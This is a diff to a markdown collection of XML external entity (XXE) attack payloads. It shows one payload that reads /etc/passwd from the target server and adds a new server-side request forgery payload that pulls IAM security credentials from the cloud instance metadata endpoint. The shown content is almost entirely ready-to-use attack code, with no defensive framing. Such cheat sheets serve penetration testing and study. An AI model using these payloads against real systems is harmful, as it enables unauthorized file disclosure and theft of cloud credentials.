@@ -1,5 +1,5 @@
 ## XXE Payloads
-### Inband XXE with general entity
+### Inband XXE with general entity (external Entity)
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
@@ -8,6 +8,16 @@
 <id>&xxe;</id>
 </product>
 </stockchange>
+```
+### SSRF via XXE
+Just use http protocol instead of file protocol to have SSRF.
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
+<stockCheck>
+  <productId>&xxe;</productId>
+  <storeId>1</storeId>
+</stockCheck>
 ```
 ### Inband XXE with parameter entity
 ```xml
